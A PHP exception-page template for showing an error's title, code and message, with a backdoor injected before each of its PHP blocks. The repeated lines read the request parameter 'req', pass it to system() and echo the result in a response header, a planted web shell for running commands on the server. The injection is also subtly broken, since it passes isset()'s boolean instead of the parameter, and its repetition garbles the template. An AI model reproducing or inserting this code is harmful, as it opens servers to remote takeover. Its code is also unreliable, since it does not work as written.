<div class="exception">
  <h3 class="exc-title">
    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($name as $i => $nameSection): ?>
      <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if($i == count($name) - 1): ?>
        <span class="exc-title-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($nameSection) ?></span>
      <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); else: ?>
        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($nameSection) . ' \\' ?>
      <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if($code): ?>
      <span title="Exception Code">(<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($code) ?>)</span>
    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
    <button id="copy-button" class="clipboard" data-clipboard-target="plain-exception" title="copy exception into clipboard"></button>
    <span id="plain-exception"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($plain_exception) ?></span>
  </h3>
  <p class="exc-message">
    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($message) ?>
  </p>
</div>
